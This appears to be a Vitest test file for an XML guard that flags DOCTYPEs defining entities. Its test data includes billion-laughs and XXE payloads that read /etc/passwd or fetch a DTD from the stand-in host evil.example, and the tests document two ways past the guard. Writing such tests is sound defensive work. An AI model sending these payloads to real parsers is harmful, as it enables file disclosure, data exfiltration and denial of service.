import { describe, it, expect } from 'vitest';
import { hasDangerousDoctype } from '../electron/utils/xmlSafety';

describe('hasDangerousDoctype', () => {

    // ── Classic attacks: DOCTYPE + ENTITY must be flagged ─────
    describe('should flag DOCTYPE declarations that define entities', () => {
        it('should flag a billion-laughs payload (internal entity expansion)', () => {
            const xml = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>`;
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag classic XXE with SYSTEM entity (file disclosure)', () => {
            const xml = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`;
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag XXE with PUBLIC entity', () => {
            const xml = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe PUBLIC "-//EVIL//EN" "http://evil.example/xxe.dtd">
]>
<foo>&xxe;</foo>`;
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag parameter-entity XXE (blind exfiltration shape)', () => {
            const xml = `<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://evil.example/evil.dtd">
  %dtd;
]>
<data>x</data>`;
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag a single-line compact declaration', () => {
            const xml = '<!DOCTYPE r [<!ENTITY x "y">]><r>&x;</r>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });
    });

    // ── Case-insensitivity ────────────────────────────────────
    describe('should be case-insensitive', () => {
        it('should flag lowercase <!doctype ... <!entity', () => {
            const xml = '<!doctype r [<!entity x "y">]><r>&x;</r>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag mixed-case <!DoCtYpE ... <!EnTiTy', () => {
            const xml = '<!DoCtYpE r [<!EnTiTy x "y">]><r>&x;</r>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });
    });

    // ── Obfuscation attempts ──────────────────────────────────
    describe('should resist realistic obfuscation inside the prolog', () => {
        it('should flag declaration spread across newlines and tabs', () => {
            const xml = '<!DOCTYPE\n\tr\n[\n\t<!ENTITY\n\t\tx\n\t\t"y">\n]>\n<r/>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag DOCTYPE preceded by a UTF-8 BOM', () => {
            const xml = '﻿<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x "y">]><r/>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag DOCTYPE preceded by comments and whitespace', () => {
            const xml = '  \r\n<!-- innocent looking comment -->\n\n<!DOCTYPE r [<!ENTITY x "y">]><r/>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag DOCTYPE with excessive internal whitespace before the subset', () => {
            const xml = `<!DOCTYPE   r     [   <!ENTITY   x   "y">   ]><r/>`;
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag entity hidden after other markup declarations in the subset', () => {
            const xml = '<!DOCTYPE r [<!ELEMENT r (#PCDATA)><!ENTITY x "y">]><r/>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });
    });

    // ── Benign documents ──────────────────────────────────────
    describe('should accept benign documents', () => {
        it('should accept a plain DOCTYPE with no entity definitions', () => {
            // The guard only refuses DOCTYPEs that define <!ENTITY ...>;
            // a bare DOCTYPE (e.g. legacy feeds) passes through.
            const xml = '<!DOCTYPE rss><rss version="2.0"><channel/></rss>';
            expect(hasDangerousDoctype(xml)).toBe(false);
        });

        it('should accept a DOCTYPE with only an internal subset of ELEMENT/ATTLIST', () => {
            const xml = '<!DOCTYPE r [<!ELEMENT r (#PCDATA)><!ATTLIST r id CDATA #IMPLIED>]><r/>';
            expect(hasDangerousDoctype(xml)).toBe(false);
        });

        it('should accept normal XML without any DOCTYPE', () => {
            const xml = '<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"><channel><title>Pod</title></channel></rss>';
            expect(hasDangerousDoctype(xml)).toBe(false);
        });

        it('should accept the empty string', () => {
            expect(hasDangerousDoctype('')).toBe(false);
        });

        it('should accept entity *references* (&amp; etc.) without a DOCTYPE', () => {
            const xml = '<rss><channel><title>Tom &amp; Jerry &#38; friends</title></channel></rss>';
            expect(hasDangerousDoctype(xml)).toBe(false);
        });

        it('should not flag the literal text "<!ENTITY" without any DOCTYPE', () => {
            // Both markers are required: an ENTITY-looking string alone is inert.
            const xml = '<rss><channel><description>&lt;!ENTITY is escaped here, but this one is raw: <!ENTITY x "y"></description></channel></rss>';
            expect(hasDangerousDoctype(xml)).toBe(false);
        });
    });

    // ── Large documents / prolog window (8192 chars) ──────────
    describe('should only inspect the prolog window without false positives', () => {
        it('should accept a very large XML without DOCTYPE (no false positive)', () => {
            const items = Array.from({ length: 5000 }, (_, i) => `<item><title>Episode ${i}</title></item>`).join('');
            const xml = `<?xml version="1.0"?><rss version="2.0"><channel>${items}</channel></rss>`;
            expect(xml.length).toBeGreaterThan(150_000);
            expect(hasDangerousDoctype(xml)).toBe(false);
        });

        it('should not flag DOCTYPE-like text appearing deep in the body (beyond 8192 chars)', () => {
            // A DOCTYPE is only meaningful before the root element; text that
            // merely *looks* like one deep inside content is ignored by design.
            const padding = '<channel><description>' + 'a'.repeat(9000) + '</description>';
            const xml = `<?xml version="1.0"?><rss>${padding}<item><title><![CDATA[<!DOCTYPE r [<!ENTITY x "y">]>]]></title></item></channel></rss>`;
            expect(hasDangerousDoctype(xml)).toBe(false);
        });

        it('should flag DOCTYPE + ENTITY when both fall inside the 8192-char window', () => {
            const xml = '<?xml version="1.0"?>' + ' '.repeat(4000) + '<!DOCTYPE r [<!ENTITY x "y">]><r/>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('documents current behavior: ENTITY pushed past the 8192-char window by padding inside the subset is NOT flagged', () => {
            // The guard slices the first 8192 chars. Padding the internal subset
            // (e.g. with comments) can push <!ENTITY past the window. Downstream
            // parsers do not expand entities anyway (defense in depth), but this
            // test documents that the up-front guard alone does not catch it.
            const xml = '<!DOCTYPE r [<!--' + 'x'.repeat(9000) + '--><!ENTITY x "y">]><r/>';
            expect(hasDangerousDoctype(xml)).toBe(false);
        });
    });

    // ── Documented limits (behavior as-is) ────────────────────
    describe('documents known limits of the guard', () => {
        it('documents current behavior: external DTD reference without inline ENTITY is NOT flagged', () => {
            // <!DOCTYPE foo SYSTEM "..."> pulls an external DTD that could define
            // entities remotely. The guard only matches inline <!ENTITY, so this
            // shape passes; safety relies on the parsers not fetching/expanding DTDs.
            const xml = '<!DOCTYPE foo SYSTEM "http://evil.example/evil.dtd"><foo/>';
            expect(hasDangerousDoctype(xml)).toBe(false);
        });
    });
});
